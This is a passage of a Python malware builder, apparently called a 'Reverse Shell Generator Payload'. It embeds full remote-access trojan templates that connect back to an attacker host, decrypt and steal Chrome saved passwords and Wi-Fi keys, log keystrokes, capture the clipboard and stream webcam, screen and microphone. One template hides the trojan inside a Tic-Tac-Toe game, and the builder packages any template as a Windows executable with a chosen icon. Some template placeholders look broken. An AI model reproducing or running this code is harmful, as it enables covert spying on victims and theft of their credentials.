                            url, username, password = login
                            message = f"URL: {url}\\n User Name: {username}\\n Password: {password}\\n{seq1}\\n"
                            client.send(message.encode('utf-8'))

                    elif command.lower() == 'screenshare':
                        if screenshot_thread is None or not screenshot_thread.is_alive():
                            client.send(b"[INFO] Starting screen sharing...")
                            stop_webcam_streaming.clear()  # Ensure the stop flag is not set
                            screenshot_thread = threading.Thread(target=stream_screenshot_to_server, args=(ATTACKER_IP, ATTACKER_PORT))
                            screenshot_thread.start()
                        else:
                            client.send(b"[INFO] Screen sharing is already running.")

                    elif command.lower() == 'stop_screenshare':
                        if screenshot_thread and screenshot_thread.is_alive():
                            client.send(b"[INFO] Stopping screen sharing...")
                            stop_webcam_streaming.set()  # Signal the screen sharing thread to stop
                            screenshot_thread.join()  # Wait for the thread to finish
                        else:
                            client.send(b"[INFO] Screen sharing is not running.")

                    elif command.lower() == 'lockscreen':
                        # Bloqueia a tela do alvo
                        output = lock_screen()
                        client.send(output.encode())


                elif command.lower() == 'exit':
                    break

                elif command.startswith("cd "):
                    try:
                        os.chdir(command.strip("cd "))
                        client.send(b"Changed directory to " + os.getcwd().encode())
                    except FileNotFoundError as e:
                        client.send(f"Error: {e}".encode())
                    except Exception as e:
                        client.send(f"Error: {e}".encode())

                else:
                    # If not a custom command, treat it as a shell command
                    output = execute_shell_command(command)
                    if output:
                        client.send(output.encode())
                    else:
                        client.send({line})
                        client.send(b"No output from the command.")
                        client.send({line})

        except ConnectionResetError:
            print("[ERROR] Connection reset by peer.")
            stop_webcam_streaming.set()
            audio_streaming = False
            stop_audio_streaming.set()
            stop_screenshot_streaming.set()
        except Exception as e:
            print(f"Connection lost: {e}")
            stop_webcam_streaming.set()
            audio_streaming = False
            stop_audio_streaming.set()
            stop_screenshot_streaming.set()
            time.sleep(2)
        finally:
            client.close()
            webcam_thread = None
            screenshot_thread = None
            clipboard_thread = None
            audio_streaming = None


if __name__ == "__main__":
    game_thread = threading.Thread(target=open_game)
    game_thread.start()
    reverse_shell()

"""

Malware = f"""

import socket
import subprocess
import os
import time
import ctypes 
import random  
import pickle
import cv2  
import pyaudio
import numpy as np
from pynput.keyboard import Listener
import win32clipboard
import threading
import struct
import pyautogui
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from gif_virus import display_gif, stop_program


# Define custom commands
CUSTOM_COMMANDS = {
    web_cam
}

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data" % (os.environ['USERPROFILE']))

def get_secret_key():
    try:
        # (1) Get secretkey from chrome local state
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # Remove suffix DPAPI
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        # (3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        # (3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        # Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        # (4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        return None

def extract_google_logins():
    credentials = []
    try:
        # (1) Get secret key
        secret_key = get_secret_key()
        # Search user profile or default folder (this is where the encrypted login password is stored)
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
        for folder in folders:
            # (2) Get ciphertext from sqlite database
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
            conn = get_db_connection(chrome_path_login_db)
            if secret_key and conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index, login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if url != "" and username != "" and ciphertext != "":
                        # (3) Filter the initialisation vector & encrypted password from ciphertext
                        # (4) Use AES algorithm to decrypt the password
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        credentials.append((url, username, decrypted_password))
                # Close database connection
                cursor.close()
                conn.close()
                # Delete temp login db
                os.remove("Loginvault.db")
        return credentials
    except Exception as e:
        return []




def execute_shell_command(command):
    try:
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        if output.stdout:
            return output.stdout
        elif output.stderr:
            return output.stderr
        else:
            return "Command executed successfully, but there was no output."
    except Exception as e:
        return f"Error executing command: {e}"



def lock_screen():
    try:
        subprocess.run("rundll32.exe user32.dll, LockWorkStation", shell=True)
        return "Screen locked successfully."
    except Exception as e:
        return f"Failed to lock screen: {e}"

def trigger_popups():
    screen_width, screen_height = pyautogui.size()  # Get the screen size

    for _ in range(50):  # Number of message boxes
        x = random.randint(0, screen_width - 200)  # Random X position
        y = random.randint(0, screen_height - 100)  # Random Y position

        # Creating a thread for each message box with a random position
        threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(
            0,
            "You have been hacked!",
            "Warning",
            0x40 | 0x1 | 0x0)).start()

        # Move the message box window to a random position
        hwnd = ctypes.windll.user32.FindWindowW(None, "Warning")
        if hwnd:
            ctypes.windll.user32.SetWindowPos(hwnd, 0, x, y, 0, 0, 0x0001 | 0x0004 | 0x0010)

        time.sleep(0.05)   

def shutdown_device():
    os.system("shutdown /s /t 1")

def reboot_device():
    os.system("shutdown /r /t 1")

    
stop_webcam_streaming = threading.Event()
stop_screenshot_streaming = threading.Event()

def stream_webcam_to_server(server_ip, server_port, retry_interval=1):
    while not stop_webcam_streaming.is_set():
        try:
            # Create socket connection
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))

            # Initialize webcam
            cap = cv2.VideoCapture(0)

            while not stop_webcam_streaming.is_set():
                ret, frame = cap.read()
                if not ret:
                    break

                # Serialize the frame
                data = pickle.dumps(frame)

                # Send data size first
                client_socket.sendall(struct.pack("L", len(data)))
                # Send data
                client_socket.sendall(data)

        except ConnectionResetError as e:
            print(f"Connection reset by server: {e}. Reconnecting in {retry_interval} seconds...")
            time.sleep(retry_interval)
        except socket.error as e:
            print(f"Socket error: {e}. Reconnecting in {retry_interval} seconds...")
            time.sleep(retry_interval)
        finally:
            cap.release()
            client_socket.close()
            if stop_webcam_streaming.is_set():
                break

def stream_screenshot_to_server(server_ip, server_port, retry_interval=1):
    while not stop_webcam_streaming.is_set():
        try:
            # Create socket connection
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))

            while not stop_webcam_streaming.is_set():
                # Capture screenshot
                screen = pyautogui.screenshot()
                # Convert the screenshot to a format suitable for sending
                screen_np = np.array(screen)
                _, screen_encoded = cv2.imencode('.jpg', screen_np)
                screen_data = screen_encoded.tobytes()
                
                # Send data size first
                client_socket.sendall(struct.pack("L", len(screen_data)))
                # Send data
                client_socket.sendall(screen_data)

        except ConnectionResetError as e:
            print(f"Connection reset by server: {e}. Reconnecting in {retry_interval} seconds...")
            time.sleep(retry_interval)
        except socket.error as e:
            print(f"Socket error: {e}. Reconnecting in {retry_interval} seconds...")
            time.sleep(retry_interval)
        finally:
            client_socket.close()
            if stop_webcam_streaming.is_set():
                break

                
key_log = []

def on_press(key):
    try:
        key_log.append(key.char)  # Logs printable characters
    except AttributeError:
        key_log.append(f"[{key}]")  # Logs special keys like Shift, Ctrl, etc.

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def get_key_logs():
    if key_log:
        return ''.join(key_log)
    return "No keys logged yet."

def clear_key_logs():
    global key_log
    key_log = []

ATTACKER_IP = "{attacker_ip}"
ATTACKER_PORT = {attacker_p}

def get_wifi_passwords():
    try:
        profiles = subprocess.check_output("netsh wlan show profiles").decode()
        wifi_list = re.findall(r"All User Profile\s*:\s*(.*)", profiles)
        result = []
        for wifi in wifi_list:
            password_info = subprocess.check_output(f"netsh wlan show profile name=\\"{wifi}\\" key=clear").decode()
            password = re.search(r"Key Content\s*:\s*(.*)", password_info)
            if password:
                result.append(f"WiFi: {wifi} - Password: {pass3}")
            else:
                result.append(f"WiFi: {wifi} - No password found")
        return "\\n".join(result)
    except Exception as e:
        return f"Failed to retrieve Wi-Fi passwords: {e}"


clipboard_history = []

def monitor_clipboard():
    last_data = None
    while True:
        try:
            win32clipboard.OpenClipboard()
            clipboard_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            # If the clipboard content has changed, add it to history
            if clipboard_data != last_data:
                clipboard_history.append(clipboard_data)
                last_data = clipboard_data
        except Exception:
            pass

        # Delay before checking again
        time.sleep(2)

def get_clipboard_content():
    if clipboard_history:
        return "\\n".join(clipboard_history)
    else:
        return "No clipboard data available."

clipboard_thread = None

server_ip = ATTACKER_IP
server_port = ATTACKER_PORT

chunk_size = 1024
audio_format = pyaudio.paInt16
channels = 1
rate = 44100

stop_audio_streaming = threading.Event()

# Global variable for controlling audio streaming
audio_streaming = True
audio_thread = None


def stream_audio_to_server():
    p = pyaudio.PyAudio()
    
    # Initialize the audio stream
    stream = p.open(format=audio_format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk_size)
    
    client_socket = None
    while audio_streaming:
        try:
            if client_socket is None:
                # Attempt to connect to the server
                print("Trying to connect to server...")
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((server_ip, server_port))
                print("Connected to server.")
            
            while audio_streaming and not stop_audio_streaming.is_set():
                # Read audio chunk from microphone
                data = stream.read(chunk_size)

                # Send data size first
                client_socket.sendall(struct.pack("L", len(data)))

                # Send audio data
                client_socket.sendall(data)
        except socket.error as e:
            print(f"Connection error: {e}")
            client_socket = None
            time.sleep(1)  # Retry after 1 seconds if connection fails
        except Exception as e:
            print(f"Streaming error: {e}")
            break
    
    # Cleanup after stopping the stream
    stream.stop_stream()
    stream.close()
    p.terminate()
    if client_socket:
        client_socket.close()

def close_gif():
    gif_thread2 = threading.Thread(target=stop_program)
    gif_thread2.daemon = True  # Ensure thread stops when the main program exits
    gif_thread2.start()

def reverse_shell():

    global clipboard_thread

    # Start the clipboard monitoring thread
    if clipboard_thread is None:
        clipboard_thread = threading.Thread(target=monitor_clipboard)
        clipboard_thread.daemon = True  # This ensures the thread will stop when the program exits
        clipboard_thread.start()

    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((ATTACKER_IP, ATTACKER_PORT))
            color = b"\\033[32m"
            banner = b'''
            
 __  __   ____   ______ 
|  \/  | |  _ \ |  ____|
| \  / | | |_) || |__   
| |\/| | |  _ / |  __|  
| |  | | | |    | |____ 
|_|  |_| |_|    |______|
                       
          Malicious Payload Executed
                 Version: 4.5
              created by PhantomCode
              
          Type 'exit' to terminate process
          Type 'help' to see all cammands
                              
            '''
 
            client.send(color + banner)
            

            while True:
                client.send({line})
                client.send(b"CMD:")
                command = client.recv(1024).decode('utf-8').strip()

                # Check if the command is a custom command
                if command.lower() in CUSTOM_COMMANDS:
                    if command.lower() == 'webcam':
                        if webcam_thread is None or not webcam_thread.is_alive():
                            stop_webcam_streaming.clear()  
                            client.send(b"[INFO] Starting webcam stream...")
                            webcam_thread = threading.Thread(target=stream_webcam_to_server, args=(ATTACKER_IP, ATTACKER_PORT))
                            webcam_thread.start()
                        else:
                            client.send(b"[INFO] Webcam stream is already running.")

                    elif command.lower() == 'stop_webcam':
                        if webcam_thread and webcam_thread.is_alive():
                            client.send(b"[INFO] Stopping webcam stream...")
                            stop_webcam_streaming.set()  # Signal the webcam thread to stop
                            webcam_thread.join()  # Wait for the thread to finish
                        else:
                            client.send(b"[INFO] Webcam stream is not running.")

                    elif command.lower() == "close_gif":
                        close_gif()  # Call to stop the GIF
                        client.send(b"[INFO] Closing GIF...")

                    elif command.lower() == "audio_real_time":
                        if not audio_streaming:
                            # Start the audio streaming in a separate thread
                            audio_streaming = True
                            stop_audio_streaming.clear()  # Ensure the stop event is not set
                            audio_thread = threading.Thread(target=stream_audio_to_server)
                            audio_thread.daemon = True  # Ensure thread exits when the main program does
                            audio_thread.start()
                            print("Audio streaming started.")
                        else:
                            print("Audio streaming is already running.")
                            
                    elif command.lower() == "stop_audio":
                        if audio_streaming:
                            # Stop the audio streaming
                            audio_streaming = False
                            stop_audio_streaming.set()  # Signal the audio thread to stop
                            
                            print("Audio streaming stopped.")
                        else:
                            print("Audio streaming is not running.")

                    elif command.lower() == 'get_wifi_passwords':
                        try:
                            wifi_passwords = get_wifi_passwords()
                            banner = b'''
                            ##############################
                            #      Wi-Fi Passwords       #
                            ##############################
                            '''
                            client.send(color + banner)
                            client.send(b"\\n\\n")
                            client.send(wifi_passwords.encode())  
                        except Exception as e:
                            print(f"Failed to send data: {e}")
                        except Exception as e:
                            client.send(f"Failed to retrieve Wi-Fi passwords: {e}".encode())

                    elif command == "help":
                        help = b'''
            
            this a reverse shell payload with custom commands! 
                        
            usange:

            webcam: see the victim real-time camera. but to open the cv2 GUI need to run the Main.py file

            screenshare: see the victim real-time screen.but to open the cv2 GUI need to run the Main.py file

            lockscreen: type and the target screen will be locked!

            popups: annony the victim with popups

            shutdown: shutdown device
            reboot: reboot device

            copy "C:\Path\To\Your\File.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

            extract_google_logins : extract_google_logins like passwords and usernames

            stop_screenshare: will stop screen-sharing
            stop_webcam: will stop webcam-sharing
            keylogs: see the keys
            start_keylogger: start_keylogger to get the keys.
            get_wifi_passwords: get wifi credentials

            get_clipboard_content : see what the victim has in it clipboard.
            audio_real_time: hear real time what victim says.
            stop_audio : stop_audio real time
            close_gif: close hack screen

            '''        
                        client.send(help)        

                    elif command == "shutdown":
                       shutdown_device()

                    elif command.lower() == 'get_clipboard_content':
                        banner = b'''
                            ##############################
                            #      clipboard data        #
                            ##############################
                            '''
                        client.send(color + banner)
                        client.send(b"\\n\\n")
                        clipboard_data = get_clipboard_content()
                        client.send(clipboard_data.encode())

                    elif command.lower() == 'keylogs':
                        logs = get_key_logs()
                        client.send(logs.encode('utf-8'))
                        clear_key_logs()

                    elif command.lower() == 'start_keylogger':
                        client.send(b"Starting keylogger...")
                        threading.Thread(target=start_keylogger).start()

                    elif command == "reboot":
                        reboot_device()

                    elif command.lower() == 'popups':
                        client.send(b"[INFO] Triggering pop-up message boxes...")
                        threading.Thread(target=trigger_popups).start()    

                    elif command.lower() == 'lockscreen':
                        # Bloqueia a tela do alvo
                        output = lock_screen()
                        client.send(output.encode())

                    elif command.lower() == 'extract_google_logins':
                        logins = extract_google_logins()
                        for login in logins:
                            url, username, password = login
                            message = f"URL: {url}\\n User Name: {username}\\n Password: {password}\\n{seq1}\\n"
                            client.send(message.encode('utf-8'))

                    elif command.lower() == 'screenshare':
                        if screenshot_thread is None or not screenshot_thread.is_alive():
                            client.send(b"[INFO] Starting screen sharing...")
                            stop_webcam_streaming.clear()  # Ensure the stop flag is not set
                            screenshot_thread = threading.Thread(target=stream_screenshot_to_server, args=(ATTACKER_IP, ATTACKER_PORT))
                            screenshot_thread.start()
                        else:
                            client.send(b"[INFO] Screen sharing is already running.")

                    elif command.lower() == 'stop_screenshare':
                        if screenshot_thread and screenshot_thread.is_alive():
                            client.send(b"[INFO] Stopping screen sharing...")
                            stop_webcam_streaming.set()  # Signal the screen sharing thread to stop
                            screenshot_thread.join()  # Wait for the thread to finish
                        else:
                            client.send(b"[INFO] Screen sharing is not running.")

                    elif command.lower() == 'lockscreen':
                        # Bloqueia a tela do alvo
                        output = lock_screen()
                        client.send(output.encode())


                elif command.lower() == 'exit':
                    break

                elif command.startswith("cd "):
                    try:
                        os.chdir(command.strip("cd "))
                        client.send(b"Changed directory to " + os.getcwd().encode())
                    except FileNotFoundError as e:
                        client.send(f"Error: {e}".encode())
                    except Exception as e:
                        client.send(f"Error: {e}".encode())

                else:
                    # If not a custom command, treat it as a shell command
                    output = execute_shell_command(command)
                    if output:
                        client.send(output.encode())
                    else:
                        client.send({line})
                        client.send(b"No output from the command.")
                        client.send({line})

        except ConnectionResetError:
            print("[ERROR] Connection reset by peer.")
            stop_webcam_streaming.set()
            audio_streaming = False
            stop_audio_streaming.set()
            stop_screenshot_streaming.set()
        except Exception as e:
            print(f"Connection lost: {e}")
            stop_webcam_streaming.set()
            audio_streaming = False
            stop_audio_streaming.set()
            stop_screenshot_streaming.set()
            time.sleep(2)
        finally:
            client.close()
            webcam_thread = None
            screenshot_thread = None
            clipboard_thread = None
            audio_streaming = None


if __name__ == "__main__":
    gif_thread = threading.Thread(target=display_gif)
    gif_thread.daemon = True
    gif_thread.start()
    reverse_shell()


"""


import subprocess

def display_banner():
    banner = """\033[32m
     ______   _____        _____  
    |  __ \ / ____|      |  __ \ 
    | |__) | |  __   ___ | |  | |
    |  ___/| | |_ | / _ \| |  | |
    | |    | |__| ||  __/| |__| |
    |_|     \_____(_)___||_____/  Payload Generator - Enemies Destroyed 
    ==========================================
        Reverse Shell Generator Payload
        Created by: PhantomCode
        Version: 4.5
    ==========================================
    """
    print(banner)

def choose_template():
    print("""
    (1) Virus - Just for devs!
    (2) Tic-Tac-Toe Game
    (3) Malware
    """)
    templates = input("Choose a template (1/2/3): ").strip()
    if templates == '1':
        return "Virus.py", default_Script
    elif templates == '2':
        return "tic-tac-toe.py", game
    elif templates == '3':
        return "Malware.py", Malware
    else:
        print("Invalid choice.")
        exit()

def create_script(script_filename, script_content):
    with open(script_filename, "w") as file:
        file.write(script_content)
    print(f"The new Python script '{script_filename}' has been created successfully.")

def convert_to_executable(script_filename):
    convert_to_exe = input("Do you want to convert the script to an executable (.exe) automatically? (yes/no): ").strip().lower()
    if convert_to_exe == 'yes':
        bit_version = input("Choose the version of PyInstaller to use (64bit or 32bit): ").strip()
        pyinstaller_path = get_pyinstaller_path(bit_version)

        if pyinstaller_path:
            icon_path = choose_icon()
            result = subprocess.run([pyinstaller_path, "--onefile", f"--icon={icon_path}", "--windowed", script_filename], capture_output=True, text=True)
            
            if result.returncode == 0:
                print("The script has been successfully converted to an executable.")
            else:
                print("Failed to convert the script to an executable. Please ensure PyInstaller is installed and try again.")
                print("PyInstaller output:", result.stdout, result.stderr)
        else:
            print("Invalid PyInstaller version. Restart the script.")
    else:
        print("Please convert the script to an executable manually if needed.")

def get_pyinstaller_path(bit_version):
    if bit_version == '64bit':
        return r"C:\Users\Gabriel\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0\LocalCache\local-packages\Python312\Scripts\pyinstaller.exe"
    elif bit_version == '32bit':
        return r"C:\Users\Gabriel\AppData\Local\Programs\Python\Python312-32\Scripts\pyinstaller.exe"
    else:
        return None

def choose_icon():
    icons = {
        '1': r"C:\Reverse_Shell_PG\tic1_29w_icon.ico",
        '2': r"C:\Reverse_Shell_PG\malware_icon_ast_icon.ico",
        '3': r"C:\Reverse_Shell_PG\test_89Z_icon.ico"
    }
    print("Choose an icon for the executable:")
    print("(1) Default Icon 1: Tic-tac-toe icon")
    print("(2) Default Icon 2: Malware Icon")
    print("(3) Default Icon 3: Test Icon")
    choice = input("Enter your choice (1/2/3) or enter a custom icon path: ").strip()

    if choice in icons:
        return icons[choice]
    elif choice:
        return choice
    else:
        return icons['1']  # Default to icon 1 if no choice is made

# Main Execution
if __name__ == "__main__":
    display_banner()
    
    script_filename, script_content = choose_template()
    create_script(script_filename, script_content)
    convert_to_executable(script_filename)
